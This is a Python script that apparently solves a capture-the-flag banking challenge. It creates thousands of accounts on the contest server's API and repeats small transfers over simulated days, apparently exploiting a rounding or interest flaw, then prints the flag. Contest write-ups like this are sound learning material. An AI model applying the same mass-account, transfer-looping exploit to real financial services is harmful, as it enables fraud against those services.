#!/usr/bin/env python3
import requests
import sys

TOKEN = '1:MEUCI...'
HOST = 'http://202.38.93.111:10100'

if len(TOKEN) <= 30:
    print('请先编辑本文件，填入你的实际 token')

session = requests.Session()
session.headers['Authorization'] = f'Bearer {TOKEN}'

def get(method, **kwargs):
    r = session.get(f'{HOST}/api/{method}', params=kwargs, timeout=10)
    assert r.ok
    return r.json()

def post(method, **kwargs):
    r = session.post(f'{HOST}/api/{method}', json=kwargs, timeout=10)
    assert r.ok

post('reset')
post('create', type='credit')
for i in range(3, 20300):
    print(i)
    post('create', type='debit')
    post('transfer', src=2, dst=i, amount=167)
for date in range(1, 37):
    print('date:', date)
    post('eat', account=1)
    for i in range(3, 170):
        post('transfer', src=i, dst=2, amount=1)
    for i in range(170, 203):
        post('transfer', src=i, dst=1, amount=1)
post('eat', account=1)
print(get('user')['flag'])
